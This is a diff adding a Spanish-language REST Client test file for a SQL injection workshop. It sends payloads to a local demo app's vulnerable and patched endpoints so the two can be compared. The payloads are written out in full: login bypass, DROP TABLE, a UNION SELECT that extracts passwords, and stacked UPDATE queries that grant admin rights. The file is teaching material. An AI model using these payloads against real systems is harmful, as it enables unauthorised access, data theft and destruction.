@@ -1,0 +1,170 @@
+### SQL Injection Workshop - Pruebas HTTP
+### Usar con Visual Studio Code y la extensión REST Client
+
+### Variables de entorno
+@baseUrl = https://localhost:5001
+@vulnerableUrl = {{baseUrl}}/api/vulnerable
+@secureUrl = {{baseUrl}}/api/secure
+
+### ===========================================
+### 🚨 ENDPOINTS VULNERABLES - PARA DEMOSTRACIÓN
+### ===========================================
+
+### 1. Login Vulnerable - Ataque Básico
+POST {{vulnerableUrl}}/login
+Content-Type: application/json
+
+{
+  "username": "admin' OR '1'='1' --",
+  "password": "cualquier_cosa"
+}
+
+### 2. Login Vulnerable - Ataque Avanzado
+POST {{vulnerableUrl}}/login
+Content-Type: application/json
+
+{
+  "username": "admin'; DROP TABLE Users; --",
+  "password": "test"
+}
+
+### 3. Búsqueda Vulnerable - Exposición de Datos
+GET {{vulnerableUrl}}/search?searchTerm=%' UNION SELECT Username, Password, Email, IsAdmin FROM Users --
+
+### 4. Búsqueda Vulnerable - Ataque Simple
+GET {{vulnerableUrl}}/search?searchTerm=' OR '1'='1' --
+
+### 5. Comentario Vulnerable - Inserción Maliciosa
+POST {{vulnerableUrl}}/comments
+Content-Type: application/json
+
+{
+  "content": "'); DROP TABLE Comments; --",
+  "author": "hacker"
+}
+
+### 6. Comentario Vulnerable - Ataque de Inserción
+POST {{vulnerableUrl}}/comments
+Content-Type: application/json
+
+{
+  "content": "Comentario normal",
+  "author": "user'; UPDATE Users SET IsAdmin = 1 WHERE Username = 'user1'; --"
+}
+
+### 7. Admin Update Vulnerable - Escalación de Privilegios
+POST {{vulnerableUrl}}/admin/update
+Content-Type: application/json
+
+{
+  "username": "admin'; UPDATE Users SET IsAdmin = 1 WHERE Username = 'user1'; --",
+  "isAdmin": "true"
+}
+
+### ===========================================
+### ✅ ENDPOINTS SEGUROS - VERSIONES PARCHEADAS
+### ===========================================
+
+### 1. Login Seguro - Credenciales Válidas
+POST {{secureUrl}}/login
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": "admin123"
+}
+
+### 2. Login Seguro - Credenciales Inválidas
+POST {{secureUrl}}/login
+Content-Type: application/json
+
+{
+  "username": "admin' OR '1'='1' --",
+  "password": "cualquier_cosa"
+}
+
+### 3. Búsqueda Segura - Término Normal
+GET {{secureUrl}}/search?searchTerm=Laptop
+
+### 4. Búsqueda Segura - Término con Caracteres Especiales
+GET {{secureUrl}}/search?searchTerm=' OR '1'='1' --
+
+### 5. Comentario Seguro - Inserción Normal
+POST {{secureUrl}}/comments
+Content-Type: application/json
+
+{
+  "content": "Excelente producto, muy recomendado",
+  "author": "usuario123"
+}
+
+### 6. Comentario Seguro - Intento de Ataque
+POST {{secureUrl}}/comments
+Content-Type: application/json
+
+{
+  "content": "'); DROP TABLE Comments; --",
+  "author": "hacker"
+}
+
+### 7. Admin Update Seguro - Actualización Normal
+POST {{secureUrl}}/admin/update
+Content-Type: application/json
+
+{
+  "username": "user1",
+  "isAdmin": "true"
+}
+
+### 8. Admin Update Seguro - Intento de Ataque
+POST {{secureUrl}}/admin/update
+Content-Type: application/json
+
+{
+  "username": "admin'; UPDATE Users SET IsAdmin = 1 WHERE Username = 'user1'; --",
+  "isAdmin": "true"
+}
+
+### 9. Productos Caros - SQL Crudo Seguro
+GET {{secureUrl}}/products/expensive?minPrice=50
+
+### ===========================================
+### 🔍 PRUEBAS DE COMPARACIÓN
+### ===========================================
+
+### Comparar Login Vulnerable vs Seguro
+### Ejecutar ambos endpoints con el mismo payload malicioso
+
+### Payload Malicioso para Comparar:
+### {
+###   "username": "admin' OR '1'='1' --",
+###   "password": "cualquier_cosa"
+### }
+
+### 1. Vulnerable (debería permitir el login)
+POST {{vulnerableUrl}}/login
+Content-Type: application/json
+
+{
+  "username": "admin' OR '1'='1' --",
+  "password": "cualquier_cosa"
+}
+
+### 2. Seguro (debería rechazar el login)
+POST {{secureUrl}}/login
+Content-Type: application/json
+
+{
+  "username": "admin' OR '1'='1' --",
+  "password": "cualquier_cosa"
+}
+
+### ===========================================
+### 📊 INFORMACIÓN DEL SISTEMA
+### ===========================================
+
+### Obtener todos los usuarios (para verificar estado)
+GET {{baseUrl}}/api/secure/search?searchTerm=
+
+### Verificar comentarios
+GET {{baseUrl}}/api/secure/search?searchTerm=comentario
